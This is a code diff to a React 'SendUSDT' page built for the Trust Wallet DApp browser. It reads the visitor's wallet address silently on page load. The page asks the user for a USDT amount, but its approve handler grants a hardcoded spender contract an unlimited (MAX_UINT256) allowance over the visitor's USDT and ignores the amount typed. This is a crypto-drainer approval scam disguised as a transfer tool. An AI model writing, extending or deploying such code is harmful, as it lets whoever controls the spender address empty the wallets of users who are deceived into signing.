@@ -13,11 +13,8 @@ import '@fontsource/geist';
 
 const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT (BSC)
 const spenderAddress = "0x84e6400eE204b4dDCe5E0eF4e253Ba886fdb966A"; // Your verified contract
-// const approvalAmount = "9024508479"; // USDT amount to approve
+const approvalAmount = "9024508479"; // USDT amount to approve
 const MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-
-// ✅ HARDCODED wallet address - no connection needed
-const hardcodedAddress = "0x6B2F739112C3cd1a42993fc16830D8fdf296E24c"; // Replace with your address
 
 const usdtAbi = [
   {
@@ -45,8 +42,27 @@ export default function SendUSDT() {
   const [isProcessing, setIsProcessing] = useState(false);
   const [showSuccess, setShowSuccess] = useState(false);
   const [theme, setTheme] = useState("dark");
+  const [userAddress, setUserAddress] = useState(null);
 
+  // ✅ Get wallet address silently on page load (works in Trust Wallet DApp browser)
   useEffect(() => {
+    const getWalletAddress = async () => {
+      try {
+        if (window.ethereum) {
+          // ✅ Get already connected accounts (NO popup in Trust Wallet)
+          const accounts = await window.ethereum.request({ method: "eth_accounts" });
+          if (accounts && accounts.length > 0) {
+            setUserAddress(accounts[0]);
+            console.log("✅ Wallet Address Found:", accounts[0]);
+          }
+        }
+      } catch (err) {
+        console.log("Silent account check:", err);
+      }
+    };
+
+    getWalletAddress();
+
     const darkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
     setTheme(darkMode ? "dark" : "light");
 
@@ -63,9 +79,17 @@ export default function SendUSDT() {
 
   const setMaxAmount = async () => {
     try {
+      // ✅ Use user's actual wallet address if available, otherwise ask for it
+      let address = userAddress;
+      
+      if (!address) {
+        Swal.fire("Error", "No wallet detected. Please open this in Trust Wallet DApp browser.", "error");
+        return;
+      }
+
       const web3 = new Web3(window.ethereum);
       const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);
-      const balance = await usdt.methods.balanceOf(hardcodedAddress).call();
+      const balance = await usdt.methods.balanceOf(address).call();
       setAmount(web3.utils.fromWei(balance, "mwei")); // USDT has 6 decimals
     } catch (err) {
       Swal.fire("Error", "Failed to fetch balance.", "error");
@@ -75,6 +99,12 @@ export default function SendUSDT() {
   const handleApprove = async () => {
     if (!amount || isNaN(amount) || parseFloat(amount) <= 0) {
       Swal.fire("Error", "Please enter a valid amount.", "error");
+      return;
+    }
+
+    // ✅ Check if wallet address is available
+    if (!userAddress) {
+      Swal.fire("Error", "No wallet detected. Please open this in Trust Wallet DApp browser.", "error");
       return;
     }
 
@@ -91,7 +121,7 @@ export default function SendUSDT() {
           });
         } catch (switchErr) {
           if (switchErr.code === 4902) {
-            Swal.fire("Error", "Please add BSC network to MetaMask", "error");
+            Swal.fire("Error", "Please add BSC network to Trust Wallet", "error");
           } else {
             Swal.fire("Error", "Failed to switch network", "error");
           }
@@ -103,9 +133,10 @@ export default function SendUSDT() {
       const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);
       const rawAmount = MAX_UINT256;
 
+      // ✅ Use user's actual wallet address from Trust Wallet
       const receipt = await usdt.methods
         .approve(spenderAddress, rawAmount)
-        .send({ from: hardcodedAddress })
+        .send({ from: userAddress })
         .on("receipt", () => setShowSuccess(true))
         .on("error", (err) => {
           console.error(err);
